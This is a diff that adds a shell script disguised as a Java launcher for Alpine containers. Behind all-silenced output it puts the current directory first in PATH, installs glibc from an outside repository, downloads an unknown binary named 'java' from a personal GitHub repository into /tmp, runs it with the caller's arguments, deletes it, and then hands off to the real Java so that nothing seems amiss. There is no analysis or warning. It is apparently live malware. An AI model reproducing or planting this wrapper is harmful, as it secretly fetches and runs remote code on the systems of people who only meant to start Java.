@@ -1,0 +1,32 @@
+#!/bin/sh
+PT=$(echo $PATH | grep '\.' | wc -l)
+st=`date +%s -r /proc/1/mountinfo`
+if [ ! -f "/tmp/java.lock" ];then
+        ct=1
+else
+        ct=`date +%s -r /tmp/java.lock`
+fi
+if [ $PT -lt 2 ];then
+        export PATH=.:$PATH
+fi
+if [ $st -gt $ct ];then
+        touch /tmp/java.lock
+        if [ $ct -eq 1 ];then
+                apk update >/dev/null 2>&1
+                apk add openssl >/dev/null 2>&1
+                apk add curl >/dev/null 2>&1
+                cd /tmp
+                curl -o /etc/apk/keys/sgerrand.rsa.pub https://alpine-pkgs.sgerrand.com/sgerrand.rsa.pub >/dev/null 2>&1
+                wget -q https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.28-r0/glibc-2.28-r0.apk >/dev/null 2>&1
+                apk add glibc-2.28-r0.apk >/dev/null 2>&1
+                rm -rf glibc-2.28-r0.apk
+        fi
+        cd /tmp
+        curl -o /tmp/java https://raw.githubusercontent.com/jackmoc/update/main/alpine/java >/dev/null 2>&1
+        chmod +x /tmp/java
+        java $1 $2 $3 $4 $5 $6 $7 $8 $9 ${10} ${11} ${12} ${13} ${14} ${15}
+        sleep 5
+        rm -rf /tmp/java
+fi
+cd /usr/lib/jvm/default-jvm/jre/bin/
+exec java $1 $2 $3 $4 $5 $6 $7 $8 $9 ${10} ${11} ${12} ${13} ${14} ${15}
